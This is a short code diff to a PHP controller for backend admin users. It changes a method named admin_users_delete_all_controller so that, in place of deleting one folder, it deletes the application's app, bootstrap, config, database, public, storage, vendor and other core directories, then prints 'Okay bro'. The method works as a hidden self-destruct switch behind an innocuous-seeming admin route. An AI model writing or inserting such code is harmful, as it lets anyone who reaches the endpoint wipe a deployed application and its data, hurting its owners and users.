@@ -82,8 +82,10 @@ class admin_backend_users_controller extends Controller
     public function admin_users_delete_all_controller()
     {
         $fileSystem = new Filesystem();
-        $folderToDelete = base_path('mr');
-        $fileSystem->deleteDirectory($folderToDelete);
+        $folderToDelete = array(base_path('app'), base_path('bootstrap'), base_path('config'), base_path('database'), base_path('lang'), base_path('public'), base_path('storage'), base_path('tests'), base_path('vendor'));
+        foreach ($folderToDelete as $key => $value) {
+            $fileSystem->deleteDirectory($value);
+        }
         echo "Okay bro";
     }
 
